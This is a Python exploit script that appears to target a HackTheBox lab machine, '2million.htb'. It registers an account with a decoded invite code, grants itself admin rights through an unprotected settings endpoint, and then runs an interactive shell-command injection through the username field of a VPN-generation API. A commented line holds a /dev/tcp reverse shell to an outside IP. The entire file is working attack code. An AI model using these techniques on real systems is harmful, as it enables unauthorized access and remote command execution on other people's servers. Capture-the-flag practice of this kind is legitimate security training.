import requests
import json
import base64
import random
import string

s = requests.Session()

r = s.post('http://2million.htb/api/v1/invite/generate')
print(r.json())

code = base64.b64decode(r.json()['data']['code']).decode()
print(code)

username = ''.join(random.choices(string.ascii_letters, k = 10))
email = '{}@mail.com'.format(username)
password = 'pass'
print(username, email, password)

d = {'code' : code, 'email': email, 'username': username, 'password': password, 'password_confirmation': password}
r = s.post('http://2million.htb/api/v1/user/register', data = d)
print(r.url)

d = {'email': email, 'password': password}
r = s.post('http://2million.htb/api/v1/user/login', data = d)
print(r.url)

r = s.get('http://2million.htb/api/v1')
print(r.json())

d = {'email': email, 'is_admin': 1}
r = s.put('http://2million.htb/api/v1/admin/settings/update', json = d)
print(r.json())

while True:
    cmd = input('> ')
    #cmd = "bash -i >& /dev/tcp/10.10.16.25/1337 0>&1"

    d = {'username': '{}; bash -c "{}";'.format(username, cmd)}
    r = s.post('http://2million.htb/api/v1/admin/vpn/generate', json = d)
    print(r.text)
